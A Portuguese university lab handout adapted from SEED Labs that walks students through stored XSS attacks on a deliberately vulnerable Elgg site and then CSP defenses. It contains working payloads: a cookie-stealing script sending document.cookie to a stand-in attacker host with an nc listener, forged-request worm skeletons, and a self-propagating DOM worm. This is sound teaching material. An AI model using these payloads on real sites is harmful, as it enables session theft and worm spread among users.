# Roteiro de Lab: Ataques de Cross-Site Scripting (XSS)

Este documento contém o roteiro de laboratório para Ataques de Cross-Site Scripting (XSS). Este material foi baseado no projeto SEED Labs (https://seedsecuritylabs.org) - [Cross-Site Scripting Attack Lab (Elgg)](https://seedsecuritylabs.org/Labs_20.04/Web/Web_XSS_Elgg/), todos os créditos aos membros do projeto - especialmente Professor Wenliang Du.

> Copyright © 2006 - 2020 by Wenliang Du.
> This work is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International
> License. If you remix, transform, or build upon the material, this copyright notice must be left intact, or
> reproduced in a way that is reasonable to the medium in which the work is being re-published.

## 1. Introdução

Cross-site scripting (XSS) é um tipo de vulnerabilidade comumente encontrada em aplicações web, que permite que atacantes injetem código malicioso (por exemplo, programas JavaScript) no navegador da vítima. Usando esse código malicioso, os atacantes podem roubar as credenciais da vítima, como cookies de sessão, modificar o conteúdo de páginas e até mesmo monitorar ações do usuário.
Para demonstrar os impactos da exploração de XSS, utilizaremos uma aplicação de código aberto chamada Elgg, modificada pelo projeto SEED Labs para torná-la intencionalmente vulnerável a ataques XSS.

Neste laboratório, os estudantes precisam explorar essa vulnerabilidade para lançar um ataque XSS no Elgg modificado, de uma maneira semelhante ao que Samy Kamkar fez ao MySpace em 2005 através do notório worm Samy. O objetivo final desse ataque é espalhar um worm XSS entre os usuários, de modo que quem visualizar um perfil de usuário infectado será infectado, e quem for infectado adicionará você (ou seja, o atacante) à sua lista de amigos.

Este laboratório aborda os seguintes tópicos:
- Ataque de Cross-Site Scripting
- Worm XSS e autopropagação
- Cookies de sessão
- Requisições HTTP GET e POST
- JavaScript e Ajax
- Content Security Policy (CSP)

Referência: cobertura detalhada do ataque de Cross-Site Scripting pode ser encontrada no seguinte livro:
- Capítulo 10 do livro do SEED, *Computer & Internet Security: A Hands-on Approach*, 2ª Edição, por Wenliang Du. Mais detalhes em https://www.handsonsecurity.net.

## Informações do Lab

Sites disponíveis no ambiente:
```
www.seed-server.com
www.example32a.com
www.example32b.com
www.example32c.com
www.example60.com
www.example70.com
```

Contas de usuário. As seguintes contas de usuário foram criadas na aplicação Elgg modificada:
```
----------------------------
UserName | Password
----------------------------
admin    | seedadmin
alice    | seedalice
boby     | seedboby
charlie  | seedcharlie
samy     | seedsamy
----------------------------
```

## Tarefa 1: Postando uma Mensagem Maliciosa para Exibir uma Janela de Alerta

O objetivo desta tarefa é incorporar um programa JavaScript no perfil do usuário atacante no Elgg, de modo que, quando outro usuário vítima visualizar o perfil do atacante, o programa JavaScript será executado e uma janela de alerta será exibida.

Acesse a aplicação Elgg e faça o login com usuário `samy` (senha `seedsamy`) e adicione o seguinte programa JavaScript no campo de "descrição" do perfil do usuário. O código a seguir exibirá uma janela de alerta ao visualizar o perfil:

```
<script>alert('XSS');</script>
```

Neste caso, o código JavaScript é curto o suficiente para ser digitado no campo de descrição breve. Se você quiser executar um JavaScript longo, mas está limitado pelo número de caracteres que pode digitar no formulário, você pode armazenar o programa JavaScript em um arquivo separado, salvá-lo com a extensão `.js`, e então referenciá-lo usando o atributo src na tag `<script>`. Veja o seguinte exemplo: `<script type="text/javascript" src="http://www.example.com/myscripts.js"> </script>`

## Tarefa 2: Postando uma Mensagem Maliciosa para Exibir Cookies

O objetivo desta tarefa é incorporar um programa JavaScript no perfil do atacante na aplicação Elgg, de modo que, quando outro usuário visualizar o perfil, os cookies do usuário serão exibidos na janela de alerta. Isso pode ser feito adicionando algum código adicional ao programa JavaScript da tarefa anterior:

```
<script>alert(document.cookie);</script>
```

## Tarefa 3: Roubando Cookies da Máquina da Vítima

Na tarefa anterior, o código JavaScript malicioso escrito pelo atacante pode imprimir os cookies do usuário, mas apenas o usuário pode ver os cookies, não o atacante. Nesta tarefa, o atacante quer que o código JavaScript envie os cookies para si mesmo. Para conseguir isso, o código JavaScript malicioso precisa enviar uma requisição HTTP para o atacante, com os cookies anexados à requisição.

Podemos fazer isso fazendo com que o JavaScript malicioso insira uma tag `<img>` com seu atributo `src` configurado para a máquina do atacante. Quando o JavaScript insere a tag `img`, o navegador tenta carregar a imagem a partir da URL no campo `src`; isso resulta em uma requisição HTTP GET enviada para a máquina do atacante. O JavaScript apresentado abaixo envia os cookies para a porta 5555 da máquina do atacante (com endereço aqui configurado como `atacante-xss.local`), onde o atacante tem um servidor TCP escutando na mesma porta.

```
<script>document.write('<img src=http://atacante-xss.local:5555?c=' + escape(document.cookie) + ' >'); </script>
```

Um programa comumente usado por atacantes é o `netcat` (ou `nc`), que, se executado com a opção "-l", se torna um servidor TCP que escuta uma conexão na porta especificada. Esse programa servidor basicamente imprime tudo o que é enviado pelo cliente e envia ao cliente tudo o que é digitado pelo usuário que está executando o servidor. Digite o comando abaixo para escutar na porta 5555:

```
nc -lknv 5555
```

A opção `-l` é usada para especificar que o nc deve escutar por uma conexão de entrada em vez de iniciar uma conexão com um host remoto. A opção `-nv` é usada para fazer com que o nc forneça uma saída mais detalhada. A opção `-k` significa que, quando uma conexão é concluída, deve-se escutar por outra.

## Tarefa 4: Tornando-se Amigo da Vítima

Nesta e na próxima tarefa, realizaremos um ataque semelhante ao que Samy fez ao MySpace em 2005 (ou seja, o Worm Samy). Escreveremos um worm XSS que adiciona Samy como amigo de qualquer outro usuário que visite a página de Samy. Nesta tarefa, o worm não se autopropaga; na tarefa 6, faremos com que ele se autopropague.

Nesta tarefa, precisamos escrever um programa JavaScript malicioso que falsifique requisições HTTP diretamente do navegador da vítima, sem a intervenção do atacante. O objetivo do ataque é adicionar Samy como amigo da vítima. Utilizaremos mais uma vez o usuário `samy` no servidor Elgg.

Para adicionar um amigo para a vítima, devemos primeiro descobrir como um usuário legítimo adiciona um amigo no Elgg. Mais especificamente, precisamos descobrir o que é enviado ao servidor quando um usuário adiciona um amigo. A ferramenta de inspeção HTTP do seu navegador (ferramentas de desenvolvedor) pode nos ajudar a obter essas informações. Ela pode exibir o conteúdo de qualquer mensagem de requisição HTTP enviada pelo navegador. A partir do conteúdo, podemos identificar todos os parâmetros na requisição.

```
<script type="text/javascript">
window.onload = function () {
  var Ajax=null;

  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;  // Linha 1
  var token="&__elgg_token="+elgg.security.token.__elgg_token;  // Linha 2

  //
  //Construct the HTTP request to add Samy as a friend.
  //
  var sendurl="/xxxxx"; // <<<<------ Mude Aqui!!

  //Create and send Ajax request to add friend
  Ajax=new XMLHttpRequest();
  Ajax.open("GET", sendurl, true);
  Ajax.send();
}
</script>
```

O código acima deve ser colocado no campo "Sobre Mim" (`About Me`) da página de perfil de Samy. Este campo oferece dois modos de edição: modo Editor (padrão) e modo Texto. O modo Editor adiciona código HTML extra ao texto digitado no campo, enquanto o modo Texto não adiciona. Como não queremos nenhum código extra adicionado ao nosso código de ataque, o modo Texto deve ser ativado antes de inserir o código JavaScript acima. Isso pode ser feito clicando em "Editar HTML", que pode ser encontrado no canto superior direito do campo de texto "Sobre Mim".

Por favor, responda as seguintes perguntas:

Questão 1: Explique o propósito das Linhas 1 e 2, por que elas são necessárias?
<textarea name="questao1" rows="6" cols="80" placeholder="Escreva sua resposta aqui...">
</textarea>

Questão 2: Se a aplicação Elgg fornecer apenas o modo Editor para o campo "Sobre você" e não for possível alternar para o modo Texto, ainda é possível realizar um ataque bem-sucedido?
<textarea name="questao2" rows="6" cols="80" placeholder="Escreva sua resposta aqui...">
</textarea>

## Tarefa 5: Modificando o Perfil da Vítima

O objetivo desta tarefa é modificar o perfil da vítima quando ela visitar a página de Samy. Especificamente, modificar o campo "Sobre Mim" da vítima. Escreveremos um worm XSS para completar a tarefa. Este worm não se autopropaga; na tarefa 6, faremos com que ele se autopropague.

Semelhante à tarefa anterior, precisamos escrever um programa JavaScript malicioso que falsifique requisições HTTP diretamente do navegador da vítima, sem a intervenção do atacante. Para modificar o perfil, devemos primeiro descobrir como um usuário legítimo edita ou modifica seu perfil no Elgg. Mais especificamente, precisamos descobrir como a requisição HTTP POST é construída para modificar o perfil de um usuário. Utilizaremos a ferramenta de inspeção HTTP do Firefox. Uma vez que entendamos como é a requisição HTTP POST de modificação de perfil, podemos escrever um programa JavaScript para enviar a mesma requisição HTTP. Fornecemos um código JavaScript base que auxilia na conclusão da tarefa.

```
<script type="text/javascript">
window.onload = function(){
  //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
  //and Security Token __elgg_token
  var userName="&name="+elgg.session.user.name;
  var guid="&guid="+elgg.session.user.guid;
  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="&__elgg_token="+elgg.security.token.__elgg_token;

  //
  //Construct the content of your url.
  //
  var content="description=xxxxx";  // <<<--- Altere Aqui!!!
  var samyGuid=xxxxx;   // <<<--- Altere aqui!!!
  var sendurl="/xxxxx";   // <<<--- Altere aqui!!!

  if(elgg.session.user.guid!=samyGuid)  // Linha 1
  {
    //Create and send Ajax request to modify profile
    var Ajax=null;
    Ajax=new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
  }
}
</script>
```

Semelhante à Tarefa 4, o código acima deve ser colocado no campo "Sobre Mim" da página de perfil de Samy, e o modo Texto deve ser ativado antes de inserir o código JavaScript acima.

Por favor, responda as seguintes perguntas:

Questão 3: Por que precisamos da Linha 1? Remova esta linha e repita seu ataque. Relate e explique sua observação.
<textarea name="questao3" rows="6" cols="80" placeholder="Escreva sua resposta aqui...">
</textarea>

## Tarefa 6: Tornando o Worm XSS autopropagante

Para se tornar um worm real, o programa JavaScript malicioso deve ser capaz de se autopropagar. Ou seja, sempre que algumas pessoas visualizarem um perfil infectado, não apenas seus perfis serão modificados, mas o worm também será propagado para seus perfis, afetando ainda mais outras pessoas que visualizarem esses perfis recém-infectados. Dessa forma, quanto mais pessoas visualizarem os perfis infectados, mais rápido o worm pode se propagar. Este é exatamente o mesmo mecanismo usado pelo Worm Samy: dentro de apenas 20 horas após seu lançamento em 4 de outubro de 2005, mais de um milhão de usuários foram afetados, tornando Samy um dos vírus de propagação mais rápida de todos os tempos. O código JavaScript capaz de conseguir isso é chamado de worm de cross-site scripting autopropagante. Nesta tarefa, você precisa implementar tal worm, que não apenas modifica o perfil da vítima e adiciona o usuário "Samy" como amigo, mas também adiciona uma cópia do próprio worm ao perfil da vítima, de modo que a vítima se torna um atacante.

Para alcançar a autopropagação, quando o JavaScript malicioso modifica o perfil da vítima, ele deve copiar a si mesmo para o perfil da vítima. Existem várias abordagens para conseguir isso, e discutiremos duas abordagens comuns (utilizaremos a segunda opção!).

**Abordagem por Link**: Se o worm for incluído usando o atributo src na tag `<script>`, escrever worms autopropagantes é muito mais fácil. Discutimos o atributo src na Tarefa 1, e um exemplo é fornecido abaixo. O worm pode simplesmente copiar a seguinte tag `<script>` para o perfil da vítima, essencialmente infectando o perfil com o mesmo worm.

```
<script type="text/javascript" src="http://www.example.com/xss_worm.js">
</script>
```

**Abordagem DOM** (neste laboratório, utilizaremos essa técnica): Se o programa JavaScript inteiro (ou seja, o worm) estiver incorporado no perfil infectado, para propagar o worm para outro perfil, o código do worm pode usar as APIs DOM para recuperar uma cópia de si mesmo a partir da página web. Um exemplo de uso das APIs DOM é fornecido abaixo. Este código obtém uma cópia de si mesmo e a exibe em uma janela de alerta:

```
<script id="worm">
  var headerTag = "<script id=\"worm\" type=\"text/javascript\">";  // Linha 1
  var jsCode = document.getElementById("worm").innerHTML;           // Linha 2
  var tailTag = "</" + "script>";                                   // Linha 3
  var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);  // Linha 4

  alert(jsCode);
</script>
```

Vale ressaltar que o innerHTML (linha 2) nos fornece apenas a parte interna do código, não incluindo as tags de script ao redor. Precisamos apenas adicionar a tag de abertura `<script id="worm">` (linha 1) e a tag de fechamento `</script>` (linha 3) para formar uma cópia idêntica do código malicioso.

Quando os dados são enviados em requisições HTTP POST com o Content-Type definido como `application/x-www-form-urlencoded`, que é o tipo usado em nosso código, os dados também devem ser codificados. O esquema de codificação é chamado de codificação URL, que substitui caracteres não alfanuméricos nos dados por %HH, um sinal de porcentagem e dois dígitos hexadecimais representando o código ASCII do caractere. A função `encodeURIComponent()` na linha 4 é usada para codificar uma string em formato URL.

Faça a alteração do `About me` do usuário `samy` e teste a autopropagação do worm acessando o perfil do usuário samy a partir de outro usuário e de outro amigo do amigo.

## Tarefa 7: Derrotando Ataques XSS Usando CSP

O problema fundamental da vulnerabilidade XSS é que o HTML permite que o código JavaScript seja misturado com dados. Portanto, para resolver este problema fundamental, precisamos separar o código dos dados. Existem duas maneiras de incluir código JavaScript dentro de uma página HTML: uma é a abordagem inline e a outra é a abordagem por link. A abordagem inline coloca o código diretamente dentro da página, enquanto a abordagem por link coloca o código em um arquivo externo e o referencia a partir da página.

A abordagem inline é a responsável pela vulnerabilidade XSS, porque os navegadores não sabem de onde o código originalmente vem: é do servidor web confiável ou de usuários não confiáveis? Sem esse conhecimento, os navegadores não sabem qual código é seguro para executar e qual é perigoso. A abordagem por link fornece uma informação muito importante aos navegadores, ou seja, de onde vem o código. Os sites podem então informar aos navegadores quais fontes são confiáveis, para que os navegadores saibam qual parte do código é segura para executar. Embora os atacantes também possam usar a abordagem por link para incluir código em suas entradas, eles não conseguem colocar seu código nesses lugares confiáveis.

A maneira como os sites informam aos navegadores quais fontes de código são confiáveis é alcançada por meio de um mecanismo de segurança chamado Content Security Policy (CSP). Este mecanismo foi especificamente projetado para combater ataques XSS e ClickJacking. Tornou-se um padrão, sendo suportado pela maioria dos navegadores atualmente. O CSP não apenas restringe o código JavaScript, mas também restringe outros conteúdos da página, como limitar de onde imagens, áudio e vídeo podem vir, além de restringir se uma página pode ser colocada dentro de um iframe ou não (usado para combater ataques de ClickJacking). Aqui, vamos focar apenas em como usar o CSP para combater ataques XSS.

Para realizar experimentos com CSP, configuraremos vários sites. Os sites example60 e example70 são usados para hospedar código JavaScript. Os sites example32a, example32b e example32c são os três sites que possuem diferentes configurações de CSP.

Acesse os seguintes sites a partir do navegador na máquina do Lab:

```
http://www.example32a.com
http://www.example32b.com
http://www.example32c.com
```

A partir da navegação nos sites e das proteções adicionadas com CSP, responda as seguintes perguntas:

1. Descreva e explique suas observações ao visitar esses sites.
<textarea name="questao7_1" rows="6" cols="80" placeholder="Escreva sua resposta aqui...">
</textarea>

2. Clique no botão nas páginas web dos três sites, descreva e explique suas observações.
<textarea name="questao7_2" rows="6" cols="80" placeholder="Escreva sua resposta aqui...">
</textarea>

3. Altere a configuração do servidor no example32b (modifique a configuração do Apache), para que as Áreas 5 e 6 exibam OK. Por favor, inclua a configuração modificada no relatório do laboratório.
<textarea name="questao7_3" rows="6" cols="80" placeholder="Escreva sua resposta aqui...">
</textarea>

4. Altere a configuração do servidor no example32c (modifique o código PHP), para que as Áreas 1, 2, 4, 5 e 6 exibam OK. Por favor, inclua a configuração modificada no relatório do laboratório.
<textarea name="questao7_4" rows="6" cols="80" placeholder="Escreva sua resposta aqui...">
</textarea>

5. Por favor, explique por que o CSP pode ajudar a prevenir ataques de Cross-Site Scripting.
<textarea name="questao7_5" rows="6" cols="80" placeholder="Escreva sua resposta aqui...">
</textarea>
